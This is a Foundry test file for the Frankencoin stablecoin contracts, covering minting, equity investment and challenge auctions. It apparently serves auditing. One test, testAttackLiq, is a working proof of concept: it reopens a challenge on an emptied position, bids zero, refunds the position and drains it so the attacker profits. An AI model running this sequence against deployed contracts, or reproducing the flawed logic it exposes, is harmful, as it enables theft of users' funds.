// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../contracts/test/Strings.sol";
import "../contracts/test/TestToken.sol";
import "../contracts/IERC20.sol";
import "../contracts/Equity.sol";
import "../contracts/IReserve.sol";
import "../contracts/IFrankencoin.sol";
import "../contracts/Ownable.sol";
import "../contracts/Position.sol";
import "../contracts/IPosition.sol";
import "../contracts/MintingHub.sol";
import "../contracts/PositionFactory.sol";
import "../contracts/StablecoinBridge.sol";
import "forge-std/Test.sol";

contract GeneralTest is Test {
    MintingHub hub;
    StablecoinBridge swap;

    IERC20 xchf;
    TestToken col;
    IFrankencoin zchf;

    User alice;
    User bob;

    constructor() {
        zchf = new Frankencoin(864000);
        xchf = new TestToken("CryptoFranc", "XCHF", uint8(18));
        swap = new StablecoinBridge(
            address(xchf),
            address(zchf),
            1_000_000 ether
        );
        zchf.suggestMinter(address(swap), 0, 0, "");
        hub = new MintingHub(address(zchf), address(new PositionFactory()));
        zchf.suggestMinter(address(hub), 0, 0, "");
        col = new TestToken("Some Collateral", "COL", uint8(0));
        alice = new User(zchf);
        bob = new User(zchf);
    }

    function initPosition() public returns (address) {
        alice.obtainFrankencoins(swap, 1000 ether);
        address pos = alice.initiatePosition(col, hub);
        require(col.balanceOf(address(alice)) == 0);
        require(zchf.isPosition(pos) == address(hub));
        return pos;
    }

    function test01Equity() public {
        Equity equity = Equity(address(zchf.reserve()));
        require(
            equity.totalSupply() == 0,
            Strings.toString(equity.totalSupply())
        );
        require(zchf.equity() == 0 ether, Strings.toString(zchf.equity()));
        initPosition();
        require(zchf.equity() == 1000 ether, Strings.toString(zchf.equity())); // position fee from setup is 1000 ZCHF
        bob.obtainFrankencoins(swap, 30000 ether);
        bob.invest(1000 ether);
        require(
            equity.totalSupply() == 1000 ether,
            Strings.toString(equity.totalSupply())
        );
        bob.invest(29000 ether);
        uint256 totalSupply1 = equity.totalSupply();
        alice.obtainFrankencoins(swap, 15000 ether);
        alice.invest(15000 ether);
        require(zchf.equity() == 46000 ether, Strings.toString(zchf.equity()));
    }

    function test02DenyPosition() public {
        address pos = initPosition();
        bob.deny(hub, pos);
        require(Position(pos).cooldown() == Position(pos).expiration());
    }

    function test03MintingEarly() public {
        address pos = initPosition();
        vm.expectRevert();
        alice.mint(pos, 0);
    }

    function test04Mint() public returns (address) {
        address pos = initPosition();
        skip(7 * 86_400 + 60);
        console.log("Minting 1");
        alice.mint(pos, 1); // test small amount to provoke rounding error
        console.log("Minting by Bob");
        alice.transferOwnership(pos, address(bob));
        uint256 bobbalance = zchf.balanceOf(address(bob));
        bob.mint(pos, 7);
        require(zchf.balanceOf(address(bob)) > bobbalance);
        bob.transferOwnership(pos, address(alice));
        alice.mint(pos, 0);
        alice.mint(pos, 100000 * (10 ** 18) - 8);
        alice.adjustPosition(pos);
        require(Position(pos).minted() == 100000 ether);
        return pos;
    }

    function test05MintFail() public {
        address pos = initPosition();
        skip(7 * 86_400 + 60);
        vm.expectRevert();
        bob.mint(pos, 1);
    }

    function test06Withdraw() public {
        address pos = initPosition();
        skip(7 * 86_400 + 60);
        alice.testWithdraw(swap, Position(pos));
    }

    function testAttackLiq() public {
        // ----------------- Create empty position -----------------
        test01Equity(); // ensure there is some equity to burn
        address posAddress = test04Mint(); // create a position to be challenged
        Position pos = Position(posAddress);
        // start challenge
        col.mint(address(bob), 1 ether);
        uint256 first = bob.challenge(
            hub,
            posAddress,
            col.balanceOf(posAddress)
        );
        bob.obtainFrankencoins(swap, 55_000 ether);
        bob.bid(hub, first, 10_000 ether);
        skip(1 * 86_400 + 60);
        hub.end(first, false);
        // Assert empty Position
        assert(col.balanceOf(posAddress) == 0);
        assert(pos.minted() == 0);
        // ----------------- Create empty position -----------------

        // ----------------- ATTACK -----------------
        // Record
        uint256 zchfBalBefore = zchf.balanceOf(address(bob));
        uint256 colBalBefore = col.balanceOf(address(bob));

        // Create challenge
        uint256 second = bob.challenge(hub, posAddress, 100);
        // Bid empty
        bob.bid2(hub, second, 0);
        skip(1 * 86_400 + 60);
        // Fund
        col.mint(address(pos), 100);
        // Drain
        hub.end(second, false);

        // Record
        uint256 zchfBalAfter = zchf.balanceOf(address(bob));
        uint256 colBalAfter = col.balanceOf(address(bob));
        // ----------------- ATTACK -----------------

        // Assert empty Position and Profit
        assert(col.balanceOf(posAddress) == 0);
        assert(pos.minted() == 0);
        assert(zchfBalAfter > zchfBalBefore);
        assert(colBalAfter >= colBalBefore);
    }

    function test09EndingChallenge() public {
        test01Equity(); // ensure there is some equity to burn
        address posAddress = test04Mint(); // create a position to be challenged
        Position pos = Position(posAddress);

        // check some assumptions
        require(pos.minted() == 100000 ether);
        require(pos.collateral().balanceOf(posAddress) == 1001);

        // three challenges in parallel :)
        col.mint(address(bob), 1300);
        uint256 first = bob.challenge(hub, posAddress, 300);
        require(hub.isChallengeOpen(first));
        uint256 second = bob.challenge(hub, posAddress, 400);
        uint256 third = bob.challenge(hub, posAddress, 500);

        // avert first challenge
        alice.avertChallenge(hub, swap, first);

        // bid on others
        bob.obtainFrankencoins(swap, 55_000 ether);
        bob.bid(hub, second, 10_000 ether); // liquidation price would be 40_000
        bob.bid(hub, third, 20_000 ether); // liquidation price would be 50_000
        bob.bid(hub, third, 25_000 ether);

        (
            address challenger,
            IPosition p,
            uint256 size,
            uint256 a,
            address b,
            uint256 bid
        ) = hub.challenges(third);
        require(challenger != address(0x0), "challenge not found");
        require(size == 500);
        require(bid == 25_000 ether);

        skip(1 * 86_400 + 60);
        hub.end(second, false);
        hub.end(third, false);
    }

    function getChallenge(
        uint256 number
    ) public view returns (uint256, uint256) {
        (
            address challenger1,
            IPosition p1,
            uint256 size1,
            uint256 a1,
            address b1,
            uint256 bid1
        ) = hub.challenges(number);
        return (size1, bid1);
    }
}

contract User {
    IFrankencoin zchf;

    constructor(IFrankencoin zchf_) {
        zchf = zchf_;
    }

    function obtainFrankencoins(
        StablecoinBridge bridge,
        uint256 amount
    ) public {
        TestToken xchf = TestToken(address(bridge.chf()));
        xchf.mint(address(this), amount);
        xchf.approve(address(bridge), amount);
        require(xchf.allowance(address(this), address(bridge)) == amount);
        bridge.mint(amount);
    }

    function invest(uint256 amount) public {
        zchf.transferAndCall(address(zchf.reserve()), amount, "");
    }

    function redeem(Equity equity, uint256 amount) public {
        equity.redeem(address(this), amount);
    }

    function transfer(IERC20 token, address target, uint256 amount) public {
        token.transfer(target, amount);
    }

    function bid2(MintingHub hub, uint256 number, uint256 amount) public {
        (
            address challenger,
            IPosition p,
            uint256 size,
            uint256 a,
            address b,
            uint256 bid
        ) = hub.challenges(number);
        hub.bid(number, amount, size);
    }

    function initiatePosition(
        TestToken col,
        MintingHub hub
    ) public returns (address) {
        col.mint(address(this), 1001);
        col.approve(address(hub), 1001);
        uint256 balanceBefore = zchf.balanceOf(address(this));
        address pos = hub.openPosition(
            address(col),
            100,
            1001,
            1000000 ether,
            100 days,
            1 days,
            25000,
            100 * (10 ** 36),
            200000
        );
        require(
            (balanceBefore - hub.OPENING_FEE()) == zchf.balanceOf(address(this))
        );
        Position(pos).adjust(0, 1001, 200 * (10 ** 36));
        Position(pos).adjustPrice(100 * (10 ** 36));
        return pos;
    }

    function transferOwnership(address pos, address newOwner) public {
        Position(pos).transferOwnership(newOwner);
    }

    function deny(MintingHub hub, address pos) public {
        address[] memory empty = new address[](0);
        Position(pos).deny(empty, "not approved");
    }

    function adjustPosition(address pos) public {
        Position position = Position(pos);
        uint256 minted = position.minted();
        uint256 col = position.collateral().balanceOf(pos);
        uint256 price = position.price();
        position.adjust(minted - 100, col - 1, price);
        position.collateral().approve(pos, 1);
        position.adjust(minted, col, price);
        require(position.minted() == minted);
        require(position.collateral().balanceOf(pos) == col);
        require(position.price() == price);
    }

    function repay(Position pos, uint256 amount) public {
        uint256 balanceBefore = zchf.balanceOf(address(this));
        require(balanceBefore >= amount);
        pos.repay(amount);
        require(zchf.balanceOf(address(this)) + amount == balanceBefore);
    }

    function testWithdraw(StablecoinBridge bridge, Position pos) public {
        IERC20 col = pos.collateral();
        obtainFrankencoins(bridge, 1);
        bridge.zchf().transfer(address(pos), 1);
        uint256 initialBalance = col.balanceOf(address(pos));
        pos.withdraw(address(bridge.zchf()), address(this), 1);
        Position(pos).withdraw(address(col), address(this), 1);
        require(col.balanceOf(address(pos)) == initialBalance - 1);
        require(col.balanceOf(address(this)) == 1);
    }

    function mint(address pos, uint256 amount) public {
        uint256 balanceBefore = zchf.balanceOf(address(this));
        console.log("trying to mint on position ", pos);
        IPosition(pos).mint(address(this), amount);
        uint256 obtained = zchf.balanceOf(address(this)) - balanceBefore;
        uint256 usable = IPosition(pos).getUsableMint(amount, true);
        require(
            obtained == usable,
            string(
                abi.encodePacked(
                    Strings.toString(usable),
                    " should be ",
                    Strings.toString(obtained)
                )
            )
        );
        uint256 usableBeforeFee = IPosition(pos).getUsableMint(amount, false);
        require(
            usable <= 100 || usableBeforeFee > usable,
            string(
                abi.encodePacked(
                    Strings.toString(usableBeforeFee),
                    " should be larger than ",
                    Strings.toString(usable)
                )
            )
        );
    }

    function challenge(
        MintingHub hub,
        address pos,
        uint256 size
    ) public returns (uint256) {
        IERC20 col = IPosition(pos).collateral();
        col.approve(address(hub), size);
        return hub.launchChallenge(pos, size);
    }

    function avertChallenge(
        MintingHub hub,
        StablecoinBridge swap,
        uint256 first
    ) public {
        {
            (
                address challenger,
                IPosition p,
                uint256 size,
                uint256 a,
                address b,
                uint256 bid
            ) = hub.challenges(first);
            uint256 amount = (size * p.price()) / 10 ** 18;
            obtainFrankencoins(swap, amount);
            hub.bid(first, amount, size); // avert challenge
        }
        (
            address challenger,
            IPosition p,
            uint256 size,
            uint256 a,
            address b,
            uint256 bid
        ) = hub.challenges(first);
        require(challenger == address(0x0), "challenge not averted");
        require(!hub.isChallengeOpen(first));
    }

    function bid(MintingHub hub, uint256 number, uint256 amount) public {
        (
            address challenger,
            IPosition p,
            uint256 size,
            uint256 a,
            address b,
            uint256 bid
        ) = hub.challenges(number);
        hub.bid(number, amount, size);
        require(hub.minBid(number) > amount); // min bid must increase
    }

    function reclaimCollateral(
        MintingHub hub,
        IERC20 collateral,
        uint256 expectedAmount
    ) public {
        uint256 balanceBefore = collateral.balanceOf(address(this));
        hub.returnPostponedCollateral(address(collateral), address(this));
        uint256 balanceAfter = collateral.balanceOf(address(this));
        require(balanceBefore + expectedAmount == balanceAfter);
    }

    function restructure(
        address[] calldata helpers,
        address[] calldata addressesToWipe
    ) public {
        Equity(address(zchf.reserve())).restructureCapTable(
            helpers,
            addressesToWipe
        );
    }
}
